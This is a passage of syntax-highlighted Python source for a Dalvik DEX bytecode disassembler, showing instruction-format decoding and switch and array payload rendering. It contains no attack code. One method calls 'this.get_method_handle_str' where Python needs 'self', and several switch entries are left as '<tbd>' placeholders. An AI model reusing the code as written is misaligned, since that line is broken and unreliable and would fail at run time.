<span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;type@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">2</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_field_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;field@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">3</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_method_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;method@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">4</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_proto_sig(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;proto@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">5</span>:</span><br><span class="line">            s = <span class="variable language_">self</span>.get_call_site_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;call_site@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="number">6</span>:</span><br><span class="line">            s = this.get_method_handle_str(idx)</span><br><span class="line">            <span class="keyword">return</span> s <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">f&quot;method_handle@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;ref_kind_name(kind)&#125;</span>@<span class="subst">&#123;hex16(idx) <span class="keyword">if</span> idx &lt;= <span class="number">0xFFFF</span> <span class="keyword">else</span> hex32(idx)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_block</span>(<span class="params">insns_bytes: <span class="built_in">bytes</span>, regs_size: <span class="built_in">int</span>, ins_size: <span class="built_in">int</span>, dex: <span class="type">Optional</span>[DexFile] = <span class="literal">None</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    insns_size = <span class="built_in">len</span>(insns_bytes) // <span class="number">2</span></span><br><span class="line">    units = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;&#x27;</span> + <span class="string">&#x27;H&#x27;</span> * insns_size, insns_bytes))</span><br><span class="line">    labels_needed: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>] = &#123;&#125;</span><br><span class="line">    payload_labels: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>] = &#123;&#125;</span><br><span class="line">    switch_bases: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line">    decoded: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="type">List</span>[<span class="built_in">str</span>]]] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rn</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> reg_name(x, regs_size, ins_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fmt_ref</span>(<span class="params">kind: <span class="type">Optional</span>[<span class="built_in">int</span>], idx: <span class="built_in">int</span>, is_32: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> dex <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base = hex32(idx) <span class="keyword">if</span> is_32 <span class="keyword">else</span> hex16(idx)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;ref_kind_name(kind)&#125;</span>@<span class="subst">&#123;base&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> dex.format_ref(kind, idx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_one</span>(<span class="params">pc: <span class="built_in">int</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        u0 = units[pc]</span><br><span class="line">        op_lo = u0 &amp; <span class="number">0xFF</span></span><br><span class="line">        op_hi = (u0 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> u0 <span class="keyword">in</span> (<span class="number">0x0100</span>, <span class="number">0x0200</span>, <span class="number">0x0300</span>):</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0100</span>:</span><br><span class="line">                <span class="keyword">if</span> pc + <span class="number">4</span> &gt; insns_size: <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">&quot;# truncated packed-switch-payload&quot;</span>])</span><br><span class="line">                size = units[pc + <span class="number">1</span>]</span><br><span class="line">                lines = [<span class="string">&quot;.packed-switch 0x%08x&quot;</span> % ((units[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) | units[pc + <span class="number">2</span>])]</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                    lines.append(<span class="string">&quot;    &lt;tbd&gt;&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">&quot;.end packed-switch&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">4</span> + size * <span class="number">2</span>, lines)</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0200</span>:</span><br><span class="line">                <span class="keyword">if</span> pc + <span class="number">2</span> &gt; insns_size: <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">&quot;# truncated sparse-switch-payload&quot;</span>])</span><br><span class="line">                size = units[pc + <span class="number">1</span>]</span><br><span class="line">                lines = [<span class="string">&quot;.sparse-switch&quot;</span>]</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                    lines.append(<span class="string">&quot;    &lt;tbd&gt; -&gt; &lt;tbd&gt;&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">&quot;.end sparse-switch&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">2</span> + size * <span class="number">4</span>, lines)</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0300</span>:</span><br><span class="line">                <span class="keyword">if</span> pc + <span class="number">4</span> &gt; insns_size: <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">&quot;# truncated array-payload&quot;</span>])</span><br><span class="line">                elem_width = units[pc + <span class="number">1</span>]</span><br><span class="line">                size = (units[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) | units[pc + <span class="number">2</span>]</span><br><span class="line">                total_bytes = elem_width * size</span><br><span class="line">                cu = (total_bytes + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">                pad = cu &amp; <span class="number">1</span></span><br><span class="line">                lines = [<span class="string">f&quot;.array-data <span class="subst">&#123;elem_width&#125;</span>&quot;</span>, <span class="string">&quot;.end array-data&quot;</span>]</span><br><span class="line">                <span class="keyword">return</span> (<span class="number">4</span> + cu + pad, lines)</span><br><span class="line"></span><br><span class="line">        info = OPCODES.get(op_lo)</span><br><span class="line">        <span class="keyword">if</span> info <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span>, [<span class="string">f&quot;# unknown-op <span class="subst">&#123;hex8(op_lo)&#125;</span>&quot;</span>])</span><br><span class="line"></span><br><span class="line">        name, fmt, ref1, ref2 = info</span><br><span class="line">        a8 = op_hi</span><br><span class="line">        out: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        size = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fmt == <span class="string">&quot;10x&quot;</span>:</span><br><span class="line">            out.append(name)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;11x&quot;</span>:</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(a8)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;11n&quot;</span>:</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = s1_to_s8(a8 &amp; <span class="number">0xF</span>, <span class="number">4</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;B&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;12x&quot;</span>:</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;10t&quot;</span>:</span><br><span class="line">            off8 = s1_to_s8(a8, <span class="number">8</span>);</span><br><span class="line">            tgt = pc + off8</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;20t&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            off16 = s16(units[pc + <span class="number">1</span>]);</span><br><span class="line">            tgt = pc + off16</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;30t&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            off32 = s32_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>]);</span><br><span class="line">            tgt = pc + off32</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21t&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            off16 = s16(units[pc + <span class="number">1</span>]);</span><br><span class="line">            tgt = pc + off16</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22t&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            off16 = s16(units[pc + <span class="number">1</span>]);</span><br><span class="line">            tgt = pc + off16</span><br><span class="line">            labels_needed.setdefault(tgt, <span class="string">f&quot;:L<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;labels_needed[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21s&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            lit = s16(units[pc + <span class="number">1</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;lit&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21ih&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            val = units[pc + <span class="number">1</span>] &lt;&lt; <span class="number">16</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21lh&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            val = units[pc + <span class="number">1</span>] &lt;&lt; <span class="number">48</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;31i&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            lit = s32_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;hex32(lit)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;51l&quot;</span>:</span><br><span class="line">            size = <span class="number">5</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            lit = s64_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>], units[pc + <span class="number">3</span>], units[pc + <span class="number">4</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(lit &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;21c&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            idx = units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;fmt_ref(ref1, idx, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;31c&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            idx = (units[pc + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;fmt_ref(ref1, idx, <span class="literal">True</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22c&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            idx = units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;fmt_ref(ref1, idx, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22x&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            BBBB = units[pc + <span class="number">1</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(BBBB)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;23x&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            B = units[pc + <span class="number">1</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">            C = (units[pc + <span class="number">1</span>] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;rn(C)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22s&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            lit = s16(units[pc + <span class="number">1</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;lit&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22b&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span></span><br><span class="line">            A = a8</span><br><span class="line">            BC = units[pc + <span class="number">1</span>]</span><br><span class="line">            B = BC &amp; <span class="number">0xFF</span></span><br><span class="line">            C = s1_to_s8((BC &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, <span class="number">8</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;C&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;32x&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            AAAA = units[pc + <span class="number">1</span>];</span><br><span class="line">            BBBB = units[pc + <span class="number">2</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(AAAA)&#125;</span>, <span class="subst">&#123;rn(BBBB)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;31t&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            off32 = s32_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>]);</span><br><span class="line">            tgt = pc + off32</span><br><span class="line">            payload_labels.setdefault(tgt, <span class="string">f&quot;:payload_<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            switch_bases[tgt] = pc</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;payload_labels[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;35c&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            G = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cdef = units[pc + <span class="number">2</span>]</span><br><span class="line">            C = (cdef) &amp; <span class="number">0xF</span>;</span><br><span class="line">            D = (cdef &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            E = (cdef &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            F = (cdef &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span></span><br><span class="line">            regs = [C, D, E, F, G][:A]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(rn(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;3rc&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cccc = units[pc + <span class="number">2</span>]</span><br><span class="line">            regs = [rn(cccc + i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(A)]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;45cc&quot;</span>:</span><br><span class="line">            size = <span class="number">4</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            G = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cdef = units[pc + <span class="number">2</span>];</span><br><span class="line">            hhhh = units[pc + <span class="number">3</span>]</span><br><span class="line">            C = (cdef) &amp; <span class="number">0xF</span>;</span><br><span class="line">            D = (cdef &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            E = (cdef &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            F = (cdef &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span></span><br><span class="line">            regs = [C, D, E, F, G][:A]</span><br><span class="line">            out.append(</span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(rn(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>, <span class="subst">&#123;fmt_ref(ref2, hhhh, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;4rcc&quot;</span>:</span><br><span class="line">            size = <span class="number">4</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cccc = units[pc + <span class="number">2</span>];</span><br><span class="line">            hhhh = units[pc + <span class="number">3</span>]</span><br><span class="line">            regs = [rn(cccc + i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(A)]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>, <span class="subst">&#123;fmt_ref(ref2, hhhh, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.append(<span class="string">f&quot;# unhandled-format <span class="subst">&#123;fmt&#125;</span> (<span class="subst">&#123;name&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (size, out)</span><br><span class="line"></span><br><span class="line">    pc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pc &lt; insns_size:</span><br><span class="line">        sz, lines = decode_one(pc)</span><br><span class="line">        decoded.append((pc, <span class="built_in">max</span>(<span class="number">1</span>, sz), lines))</span><br><span class="line">        pc += <span class="built_in">max</span>(<span class="number">1</span>, sz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pco <span class="keyword">in</span> <span class="built_in">list</span>(payload_labels.keys()):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= pco &lt; insns_size:</span><br><span class="line">            u0 = units[pco]</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0100</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:pswitch_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> u0 == <span class="number">0x0200</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:sswitch_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> u0 == <span class="number">0x0300</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:array_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:payload_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    out: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">    out.append(<span class="string">f&quot;.registers <span class="subst">&#123;regs_size&#125;</span>&quot;</span>)</span><br><span class="line">    out.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    label_for_pc = &#123;pc: name <span class="keyword">for</span> pc, name <span class="keyword">in</span> labels_needed.items()&#125;</span><br><span class="line">    label_for_pc.update(&#123;pc: name <span class="keyword">for</span> pc, name <span class="keyword">in</span> payload_labels.items()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">render_payload</span>(<span class="params">pc0: <span class="built_in">int</span>, content_lines: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        u0 = units[pc0]</span><br><span class="line">        lines: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        <span class="keyword">if</span> u0 == <span class="number">0x0100</span>:</span><br><span class="line">            size = units[pc0 + <span class="number">1</span>] <span class="keyword">if</span> pc0 + <span class="number">1</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            first_key = s32_from_u2(units[pc0 + <span class="number">2</span>], units[pc0 + <span class="number">3</span>]) <span class="keyword">if</span> pc0 + <span class="number">3</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            base_pc = switch_bases.get(pc0, pc0)</span><br><span class="line">            lines.append(<span class="string">f&quot;.packed-switch <span class="subst">&#123;hex32(first_key)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                idx = pc0 + <span class="number">4</span> + i * <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> idx + <span class="number">1</span> &gt;= insns_size:</span><br><span class="line">                    lines.append(<span class="string">&quot;# truncated targets&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                tgt_rel = s32_from_u2(units[idx], units[idx + <span class="number">1</span>])</span><br><span class="line">                tgt_abs = base_pc + tgt_rel</span><br><span class="line">                lbl = label_for_pc.get(tgt_abs, <span class="string">f&quot;:L<span 